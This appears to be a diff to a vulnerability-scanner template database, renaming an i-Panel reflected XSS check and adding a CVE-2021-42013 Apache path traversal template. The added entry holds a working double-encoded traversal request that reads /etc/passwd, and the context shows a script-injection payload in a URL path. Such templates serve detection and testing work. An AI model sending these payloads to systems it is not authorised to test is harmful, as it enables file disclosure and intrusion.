@@ -36169,7 +36169,7 @@
           "cwe-id": "CWE-79"
         },
         "description": "A reflected cross-site scripting (XSS) vulnerability exists in the i-Panel Administration System Version 2.0 that enables a remote attacker to execute arbitrary JavaScript code in the browser-based web console.",
-        "name": "JustWriting - Reflected XSS",
+        "name": "i-Panel Administration System - Reflected XSS",
         "reference": [
           "https://cybergroot.com/cve_submission/2021-1/XSS_i-Panel_2.0.html",
           "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41878"
@@ -36206,6 +36206,44 @@
           "path": [
             "{{BaseURL}}/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-42013",
+      "info": {
+        "author": "nvn1729",
+        "description": "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \"require all denied\" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. In certain configurations, for instance if mod_cgi is enabled, this flaw can lead to remote code execution. This issue only affects Apache 2.4.49 and 2.4.50 and not earlier versions. Note - CVE-2021-42013 is due to an incomplete fix for the original vulnerability CVE-2021-41773.",
+        "name": "Apache 2.4.49/2.4.50 - Path Traversal and Remote Code Execution",
+        "reference": [
+          "https://github.com/apache/httpd/commit/5c385f2b6c8352e2ca0665e66af022d6e936db6d",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-42013",
+          "https://twitter.com/itsecurityco/status/1446136957117943815"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,lfi,apache,rce,misconfig"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n"
+          ],
+          "unsafe": true
         }
       ]
     }
